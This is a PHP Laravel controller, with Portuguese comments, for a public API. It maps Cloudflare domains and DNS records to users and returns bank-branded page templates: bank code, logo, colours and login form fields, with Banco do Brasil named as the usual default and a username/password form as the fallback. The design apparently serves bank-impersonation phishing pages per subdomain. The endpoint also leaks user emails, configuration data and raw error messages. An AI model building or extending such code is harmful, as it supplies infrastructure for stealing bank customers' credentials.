<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\CloudflareDomain;
use App\Models\DnsRecord;
use App\Models\BankTemplate;
use App\Models\Usuario;
use App\Models\UserConfig;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\DB;

class PublicApiController extends Controller
{
    /**
     * Retorna os dados de um domínio/subdomínio com base no identificador (nome do domínio)
     *
     * @param  string  $identifier
     * @return \Illuminate\Http\JsonResponse
     */
    public function getDomainData($identifier)
    {
        try {
            // Log da tentativa de acesso
            Log::info('API Pública - Tentativa de acesso para domínio: ' . $identifier);
            
            // Abordagem 1: Buscar pelo registro DNS
            $dnsRecord = DnsRecord::where('name', $identifier)
                               ->where('status', 'active')
                               ->first();
            
            if (!$dnsRecord) {
                // Abordagem 2: Tentar encontrar pelo domínio Cloudflare
                $cfDomain = CloudflareDomain::where('name', 'like', '%'.$identifier.'%')
                                     ->first();
                                     
                if ($cfDomain) {
                    Log::info('API Pública - Domínio Cloudflare encontrado: ' . $cfDomain->id . ' - ' . $cfDomain->name);
                    
                    // Buscar o usuário associado pelo pivot
                    $usuarios = $cfDomain->usuarios;
                    
                    if ($usuarios && $usuarios->count() > 0) {
                        $usuario = $usuarios->first();
                        
                        // Criar um response manual com dados do Cloudflare
                        $response = [
                            'status' => 'success',
                            'domain' => [
                                'name' => $cfDomain->name,
                                'type' => 'CloudflareDomain',
                                'content' => $cfDomain->name_servers ? json_encode($cfDomain->name_servers) : '',
                                'proxied' => true
                            ],
                            'user' => [
                                'id' => $usuario->id,
                                'name' => $usuario->nome,
                                'email' => $usuario->email
                            ],
                            'cloudflare' => [
                                'zone_id' => $cfDomain->zone_id,
                                'status' => $cfDomain->status,
                                'paused' => (bool)$cfDomain->paused,
                                'name_servers' => $cfDomain->name_servers
                            ]
                        ];
                        
                        // Adicionar dados da pivot
                        $pivotData = DB::table('cloudflare_domain_usuario')
                            ->where('cloudflare_domain_id', $cfDomain->id)
                            ->where('usuario_id', $usuario->id)
                            ->first();
                            
                        if ($pivotData) {
                            $configData = json_decode($pivotData->config ?? '{}', true);
                            $response['domain_config'] = [
                                'status' => $pivotData->status ?? 'active',
                                'notes' => $pivotData->notes ?? '',
                                'config' => $configData
                            ];
                        }
                        
                        // Buscar template
                        $bankTemplate = BankTemplate::where('usuario_id', $usuario->id)->first();
                        
                        if ($bankTemplate) {
                            $response['template'] = [
                                'id' => $bankTemplate->id,
                                'name' => $bankTemplate->name,
                                'bank_code' => $bankTemplate->bank_code,
                                'logo_url' => $bankTemplate->logo_url,
                                'colors' => [
                                    'primary' => $bankTemplate->primary_color,
                                    'secondary' => $bankTemplate->secondary_color,
                                    'accent' => $bankTemplate->accent_color
                                ]
                            ];
                        }
                        
                        // Buscar configurações gerais do usuário
                        $userConfig = UserConfig::where('user_id', $usuario->id)->first();
                        if ($userConfig) {
                            $response['user_config'] = [
                                'id' => $userConfig->id,
                                'config' => $userConfig->config,
                                'config_json' => $userConfig->config_json
                            ];
                        }
                        
                        return response()->json($response);
                    }
                }
                
                Log::warning('API Pública - Domínio não encontrado: ' . $identifier);
                return response()->json([
                    'status' => 'error',
                    'message' => 'Domínio não encontrado ou inativo'
                ], 404);
            }
            
            Log::info('API Pública - DNS Record encontrado: ' . $dnsRecord->id . ' - ' . $dnsRecord->name);
            
            // Verificar se o registro tem user_id preenchido
            Log::info('API Pública - ID do usuário associado ao registro DNS: ' . ($dnsRecord->user_id ?? 'NULL'));
            
            // Verificar se o domínio está associado a um usuário
            $usuario = $dnsRecord->user;
            
            if (!$usuario) {
                Log::warning('API Pública - Domínio não associado a usuário: ' . $identifier);
                return response()->json([
                    'status' => 'error',
                    'message' => 'Domínio não associado a um usuário'
                ], 404);
            }
            
            Log::info('API Pública - Usuário encontrado: ' . $usuario->id . ' - ' . $usuario->nome);
            
            // Buscar o template associado ao registro DNS ou ao usuário
            $bankTemplate = null;
            
            // Verificar se o campo bank_template_id existe no modelo Usuario
            $hasTemplateField = false;
            if (array_key_exists('bank_template_id', $usuario->getAttributes())) {
                $hasTemplateField = true;
                Log::info('API Pública - Campo bank_template_id existe no usuário, valor: ' . ($usuario->bank_template_id ?? 'NULL'));
            } else {
                Log::warning('API Pública - Campo bank_template_id não existe no modelo Usuario');
            }
            
            // Verificar se existem configurações e templates para este domínio
            $directTemplate = BankTemplate::where('usuario_id', $usuario->id)->first();
            if ($directTemplate) {
                Log::info('API Pública - Template direto encontrado para o usuário: ' . $directTemplate->id);
                $bankTemplate = $directTemplate;
            }
            
            // Buscar configurações do usuário associadas a este domínio/registro
            $userConfig = \App\Models\UserConfig::where('record_id', $dnsRecord->id)
                ->orWhere('user_id', $usuario->id)
                ->first();
            
            if ($userConfig) {
                Log::info('API Pública - Configuração do usuário encontrada: ' . $userConfig->id);
                
                // Se encontrou configuração, verificar o template associado
                if ($userConfig->template_id) {
                    Log::info('API Pública - Template ID na configuração: ' . $userConfig->template_id);
                    $bankTemplate = $userConfig->template;
                    if ($bankTemplate) {
                        Log::info('API Pública - Template carregado via configuração: ' . $bankTemplate->id);
                    } else {
                        Log::warning('API Pública - Não foi possível carregar o template a partir da configuração');
                    }
                }
            } else {
                Log::warning('API Pública - Nenhuma configuração encontrada para o usuário ou registro DNS');
            }
            
            // Caso contrário, tentar pelo bank_template_id do usuário (se existir)
            if (!$bankTemplate && $hasTemplateField && $usuario->bank_template_id) {
                Log::info('API Pública - Tentando carregar template pelo bank_template_id do usuário: ' . $usuario->bank_template_id);
                $bankTemplate = BankTemplate::find($usuario->bank_template_id);
                if ($bankTemplate) {
                    Log::info('API Pública - Template encontrado: ' . $bankTemplate->id);
                } else {
                    Log::warning('API Pública - Template não encontrado pelo ID');
                }
            }
            
            // Montar resposta com os dados necessários
            $response = [
                'status' => 'success',
                'domain' => [
                    'name' => $dnsRecord->name,
                    'type' => $dnsRecord->type,
                    'content' => $dnsRecord->content,
                    'proxied' => (bool)$dnsRecord->proxied
                ],
                'user' => [
                    'id' => $usuario->id,
                    'name' => $usuario->nome,
                    'email' => $usuario->email
                ]
            ];
            
            // Adicionar informações de template se existir
            if ($bankTemplate) {
                $response['template'] = [
                    'id' => $bankTemplate->id,
                    'name' => $bankTemplate->name,
                    'bank_code' => $bankTemplate->bank_code,
                    'logo_url' => $bankTemplate->logo_url,
                    'colors' => [
                        'primary' => $bankTemplate->primary_color,
                        'secondary' => $bankTemplate->secondary_color,
                        'accent' => $bankTemplate->accent_color
                    ]
                ];
            } else {
                // Se não houver template específico para o usuário, busque um template padrão
                // Primeiro template do sistema (geralmente ID 1 - Banco do Brasil conforme diagnóstico)
                $defaultTemplate = BankTemplate::first();
                
                if ($defaultTemplate) {
                    $response['template'] = [
                        'id' => $defaultTemplate->id,
                        'name' => $defaultTemplate->name,
                        'bank_code' => $defaultTemplate->bank_code,
                        'logo_url' => $defaultTemplate->logo_url,
                        'colors' => [
                            'primary' => $defaultTemplate->primary_color,
                            'secondary' => $defaultTemplate->secondary_color,
                            'accent' => $defaultTemplate->accent_color
                        ],
                        'is_default' => true  // Flag indicando que este é um template padrão
                    ];
                }
            }
            
            // Vamos buscar TODAS as configurações personalizadas existentes para este usuário/domínio 
            // Sem criar nenhum dado padrão quando não existir
            $userCustomConfig = [];
            
            // Verificar se existe registro de domínio no Cloudflare com configurações customizadas
            $cfDomain = CloudflareDomain::where('name', 'like', '%' . $identifier . '%')->first();
            if ($cfDomain) {
                Log::info('API Pública - Encontrou domínio no Cloudflare: ' . $cfDomain->name);
                
                // IMPORTANTE: Buscar associação entre domínio e usuário para configurações customizadas
                $pivotData = DB::table('cloudflare_domain_usuario')
                    ->where('cloudflare_domain_id', $cfDomain->id)
                    ->where('usuario_id', $usuario->id)
                    ->first();
                    
                if ($pivotData && isset($pivotData->config) && $pivotData->config) {
                    Log::info('API Pública - Encontrou configurações PERSONALIZADAS na tabela pivot');
                    $pivotConfig = json_decode($pivotData->config, true);
                    if (is_array($pivotConfig)) {
                        $userCustomConfig = $pivotConfig;
                        $response['config_source'] = 'cloudflare_domain_usuario';
                    }
                }
            }
            
            // Verificar também se há configurações na tabela user_configs
            if ($userConfig) {
                Log::info('API Pública - Verificando configurações na tabela user_configs');
                
                if ($userConfig->config_json && !empty($userConfig->config_json) && $userConfig->config_json != '{}') {
                    $userConfigData = json_decode($userConfig->config_json, true);
                    if (is_array($userConfigData) && !empty($userConfigData)) {
                        Log::info('API Pública - Encontrou configurações PERSONALIZADAS em config_json');
                        // Se ainda não temos configurações do pivot, usar estas como principal
                        if (empty($userCustomConfig)) {
                            $userCustomConfig = $userConfigData;
                            $response['config_source'] = 'user_configs.config_json';
                        }
                        // Caso contrário, usar como complementar
                        else {
                            $userCustomConfig = array_merge($userCustomConfig, $userConfigData);
                            $response['config_source'] = 'combined';
                        }
                    }
                }
                
                // Verificar campo config (array)
                if (is_array($userConfig->config) && !empty($userConfig->config)) {
                    Log::info('API Pública - Encontrou configurações PERSONALIZADAS em config');
                    if (empty($userCustomConfig)) {
                        $userCustomConfig = $userConfig->config;
                        $response['config_source'] = 'user_configs.config';
                    } else {
                        $userCustomConfig = array_merge($userCustomConfig, $userConfig->config);
                        $response['config_source'] = 'combined';
                    }
                }
            }
            
            // Buscar os campos REAIS do template bancário, sem criar dados fictícios
            if ($bankTemplate) {
                Log::info('API Pública - Buscando campos reais do template bancário id=' . $bankTemplate->id);
                
                // Dados básicos do template
                $templateData = [
                    'id' => $bankTemplate->id,
                    'name' => $bankTemplate->name,
                    'bank_code' => $bankTemplate->bank_code,
                    'description' => $bankTemplate->description,
                ];
                
                // Buscar todos os campos do template na tabela bank_fields
                $fields = DB::table('bank_fields')
                    ->where('bank_template_id', $bankTemplate->id)
                    ->orderBy('order', 'asc')
                    ->get();
                
                Log::info('API Pública - Encontrou ' . $fields->count() . ' campos para o template');
                
                // Montar estrutura limpa com os campos que existem no banco de dados
                $camposConfig = [];
                $camposOrder = [];
                
                // Processar cada campo encontrado no banco de dados
                foreach ($fields as $field) {
                    // Adiciona chave do campo na lista de ordem
                    $camposOrder[] = $field->field_key;
                    
                    // Adiciona configuração do campo
                    $camposConfig[$field->field_key] = [
                        'id' => $field->id,
                        'name' => $field->name,
                        'key' => $field->field_key,
                        'type' => $field->field_type,
                        'visible' => (bool)$field->active,
                        'required' => (bool)$field->is_required,
                        'order' => $field->order,
                        'description' => $field->description ?? null,
                        'options' => $field->options ? json_decode($field->options, true) : null
                    ];
                }
                
                // Aplicar configurações personalizadas do usuário se existirem
                if ($userCustomConfig && isset($userCustomConfig['campos']) && is_array($userCustomConfig['campos'])) {
                    Log::info('API Pública - Aplicando configurações personalizadas aos campos do template');
                    
                    // Aplicar configurações personalizadas para cada campo
                    foreach ($userCustomConfig['campos'] as $campoKey => $campoConfig) {
                        if (isset($camposConfig[$campoKey])) {
                            // Mesclar configurações personalizadas com as do campo
                            $camposConfig[$campoKey] = array_merge($camposConfig[$campoKey], $campoConfig);
                        } else if (is_array($campoConfig)) {
                            // Se é um novo campo personalizado, adicionar diretamente
                            $camposConfig[$campoKey] = $campoConfig;
                            // Adicionar à lista de ordem se ainda não estiver lá
                            if (!in_array($campoKey, $camposOrder)) {
                                $camposOrder[] = $campoKey;
                            }
                        }
                    }
                    
                    // Se o usuário definiu uma ordem específica para os campos, usar ela
                    if (isset($userCustomConfig['order']) && is_array($userCustomConfig['order'])) {
                        $camposOrder = $userCustomConfig['order'];
                    }
                }
                
                // Montar resposta final
                $response['fields'] = [
                    'template_id' => $bankTemplate->id,
                    'campos' => $camposConfig,
                    'order' => $camposOrder,
                    'total' => count($camposConfig)
                ];
                
                // Adicionar dados do template
                $response['template'] = $templateData;
                
                // Se tem estilo personalizado, adicionar
                if ($userCustomConfig && isset($userCustomConfig['style'])) {
                    $response['fields']['style'] = $userCustomConfig['style'];
                }
            } else {
                // Fallback para configuração padrão se não encontrou template
                Log::info('API Pública - Nenhum template encontrado, usando configuração padrão');
                
                $response['template_config'] = [
                    'id' => 0,
                    'name' => 'Template Padrão',
                    'colors' => ['primary' => '#0066cc', 'secondary' => '#003366', 'accent' => '#ff9900'],
                    'logo' => '',
                    'layout' => 'standard',
                    'campos' => [
                        'order' => ['username', 'password'],
                        'username' => [
                            'visible' => true,
                            'required' => true,
                            'label' => 'Usuário',
                            'placeholder' => 'Digite seu usuário',
                            'icon' => 'user',
                            'order' => 1
                        ],
                        'password' => [
                            'visible' => true, 
                            'required' => true,
                            'label' => 'Senha',
                            'placeholder' => 'Digite sua senha',
                            'icon' => 'lock',
                            'order' => 2
                        ]
                    ],
                    'is_default' => true
                ];
            }
            
            // 6. Adicionar a configuração original do usuário para fins de debug/desenvolvimento
            if ($userCustomConfig) {
                $response['user_custom_config'] = $userCustomConfig;
            }
            
            // Verificar se o domínio também está na tabela CloudflareDomain para buscar configs adicionais
            $cfDomain = CloudflareDomain::where('name', 'like', '%'.$identifier.'%')->first();
            if ($cfDomain) {
                $pivotData = DB::table('cloudflare_domain_usuario')
                    ->where('cloudflare_domain_id', $cfDomain->id)
                    ->where('usuario_id', $usuario->id)
                    ->first();
                    
                if ($pivotData) {
                    $configData = json_decode($pivotData->config ?? '{}', true);
                    $response['domain_config'] = [
                        'status' => $pivotData->status ?? 'active',
                        'notes' => $pivotData->notes ?? '',
                        'config' => $configData
                    ];
                }
            }
            
            return response()->json($response);
            
        } catch (\Exception $e) {
            Log::error('Erro na API pública: ' . $e->getMessage());
            Log::error('Stack trace: ' . $e->getTraceAsString());
            
            return response()->json([
                'status' => 'error',
                'message' => 'Erro ao processar a solicitação: ' . $e->getMessage()
            ], 500);
        }
    }
}
